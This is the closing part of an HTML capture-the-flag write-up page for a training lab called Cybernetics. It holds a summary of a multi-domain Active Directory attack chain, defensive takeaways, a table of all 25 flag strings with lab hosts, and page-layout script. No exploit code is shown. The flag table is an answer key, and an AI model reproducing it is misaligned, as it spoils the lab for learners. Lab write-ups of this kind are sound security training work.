+<p>The Cybernetics Pro Lab demonstrates a comprehensive red team engagement spanning five interconnected Active Directory domains. The attack chain begins with a DNN deserialization vulnerability on the perimeter, pivots through SQL Server linked instances, leverages Kerberos delegation attacks (constrained, RBCD, and unconstrained), exploits DevOps infrastructure (Jenkins, GitLab, Ansible, HashiCorp Vault), uses phishing for initial access to workstations, and ultimately achieves domain admin across all five domains through DCSync, GMSA password reads, and cross-domain trust exploitation.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">Key Takeaways</div>
+  <p>This lab emphasizes the importance of defense-in-depth. A single deserialization vulnerability on the perimeter cascaded into full enterprise compromise through chained attacks. The key lessons include: always validate and restrict deserialization, monitor for delegation misconfigurations, secure DevOps pipelines and secrets management, enforce code signing properly, and audit cross-domain trust relationships.</p>
+</div>
+
+<table>
+  <tr><th>Flag</th><th>Name</th><th>Location</th></tr>
+  <tr><td>1</td><td>De$3R!al!z@ti0n</td><td>CYWEBDW (10.10.110.10)</td></tr>
+  <tr><td>2</td><td>Sql$erv3rL!nkCr@wl</td><td>M3SQLW (10.9.20.11)</td></tr>
+  <tr><td>3</td><td>CR3d$_!n_fil3s</td><td>M3WEBAW (10.9.20.12)</td></tr>
+  <tr><td>4</td><td>C0n$tr@!n3d!</td><td>M3DC (10.9.20.10)</td></tr>
+  <tr><td>5</td><td>W3lC0m3_2_Cyb3rn3t!cs</td><td>COREWEBDL (10.9.15.11)</td></tr>
+  <tr><td>6</td><td>Cr3d$_!n_De$cr!pti0ns</td><td>COREWEBDL LDAP</td></tr>
+  <tr><td>7</td><td>Y0u_C@nt_Ph!$h_M3</td><td>COREWKT001 (10.9.15.200)</td></tr>
+  <tr><td>8</td><td>D3vOP$_S3cure_Cr3d$</td><td>DevOps share (cyfs.cyber.local)</td></tr>
+  <tr><td>9</td><td>D3vOP$_C0d3_S!gning</td><td>COREWKT001</td></tr>
+  <tr><td>10</td><td>CR3@t0rS!D</td><td>COREWKT002 (10.9.15.201)</td></tr>
+  <tr><td>11</td><td>T0mc@t_W3b@pp$</td><td>COREWEBTW (10.9.15.12)</td></tr>
+  <tr><td>12</td><td>RD$_U$3r_$h3ll</td><td>CYAPP (10.9.10.18)</td></tr>
+  <tr><td>13</td><td>RD$_App$_Br3ak0ut$</td><td>CYAPP</td></tr>
+  <tr><td>14</td><td>P@r3nt_D0ma!n_T@ke0v3r</td><td>CYDC (10.9.10.10)</td></tr>
+  <tr><td>15</td><td>Ch!ld_D0ma!n_T@ke0v3r</td><td>COREDC (10.9.15.10)</td></tr>
+  <tr><td>16</td><td>M0n!t0r_t00l_RC3</td><td>MONITOR (10.9.10.16)</td></tr>
+  <tr><td>17</td><td>J3nk!n$_$AML</td><td>D3WEBJW (10.9.30.12)</td></tr>
+  <tr><td>18</td><td>V@ult_AP!</td><td>VAULT (10.9.30.13)</td></tr>
+  <tr><td>19</td><td>An$!bl3_3ncrypt!0n</td><td>ANSIBLE (10.9.30.11)</td></tr>
+  <tr><td>20</td><td>C0r3_M3ltd0wn</td><td>D3DC (10.9.30.10)</td></tr>
+  <tr><td>21</td><td>Un@tt3ndJ0!nCr3d$</td><td>INWKT001 (10.9.40.200)</td></tr>
+  <tr><td>22</td><td>0ff!c3Sh3llz</td><td>INWKT001</td></tr>
+  <tr><td>23</td><td>EF$_3ncrypt3!0n</td><td>INWKT001 (VPN folder)</td></tr>
+  <tr><td>24</td><td>G!tl@bRC3</td><td>INWEBJW (10.9.40.12)</td></tr>
+  <tr><td>25</td><td>N3v3r$t0pDr3@m!ng</td><td>INDC (10.9.40.5)</td></tr>
+</table>
+
+</main>
+</div>
+
+<footer class="site-footer">&copy; 2025 QA210 &mdash; All rights reserved</footer>
+
+<script>
+// ── Three.js Background ──
+(function(){
+  const c=document.getElementById('three-bg'),r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
+  r.setSize(window.innerWidth,window.innerHeight);r.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(55,window.innerWidth/window.innerHeight,0.1,1000);
+  cam.position.z=5;
+  const geo=new THREE.TorusKnotGeometry(1.2,0.35,128,32,2,3);
+  const mat=new THREE.MeshBasicMaterial({color:0x00d4aa,wireframe:true,transparent:true,opacity:0.15});
+  const mesh=new THREE.Mesh(geo,mat);s.add(mesh);
+  const geo2=new THREE.TorusKnotGeometry(1.8,0.15,100,24,3,5);
+  const mat2=new THREE.MeshBasicMaterial({color:0x58a6ff,wireframe:true,transparent:true,opacity:0.08});
+  const mesh2=new THREE.Mesh(geo2,mat2);s.add(mesh2);
+  function a(){requestAnimationFrame(a);mesh.rotation.x+=0.002;mesh.rotation.y+=0.003;mesh2.rotation.x-=0.001;mesh2.rotation.y+=0.002;r.render(s,cam)}
+  a();window.addEventListener('resize',()=>{cam.aspect=window.innerWidth/window.innerHeight;cam.updateProjectionMatrix();r.setSize(window.innerWidth,window.innerHeight)});
+})();
+
+// ── TOC Generator ──
+function buildToc(){
+  const main=document.querySelector('.main-content');
+  const headings=main.querySelectorAll('h2,h3');
+  const tocD=document.getElementById('tocDesktop');
+  const tocM=document.getElementById('tocMobile');
+  tocD.innerHTML='';tocM.innerHTML='';
+  headings.forEach(h=>{
+    if(!h.id)h.id=h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const li=document.createElement('li');
+    const a=document.createElement('a');
+    a.href='#'+h.id;a.textContent=h.textContent;
+    if(h.tagName==='H3')a.classList.add('toc-h3');
+    a.addEventListener('click',()=>{tocD.querySelectorAll('a').forEach(x=>x.classList.remove('active'));a.classList.add('active')});
+    li.appendChild(a);tocD.appendChild(li.cloneNode(true));tocM.appendChild(li);
+  });
+}
+buildToc();
+
+// ── Scroll Spy ──
+const observer=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      document.querySelectorAll('.toc-sidebar a').forEach(a=>a.classList.remove('active'));
+      const link=document.querySelector(`.toc-sidebar a[href="#${e.target.id}"]`);
+      if(link)link.classList.add('active');
+    }
+  });
+},{rootMargin:'-70px 0px -80% 0px'});
+document.querySelectorAll('.main-content h2,.main-content h3').forEach(h=>observer.observe(h));
+
+// ── Copy Button ──
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{btn.textContent='Copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000)});
+}
+
+// ── Mobile TOC ──
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+</script>
+</body>
+</html>
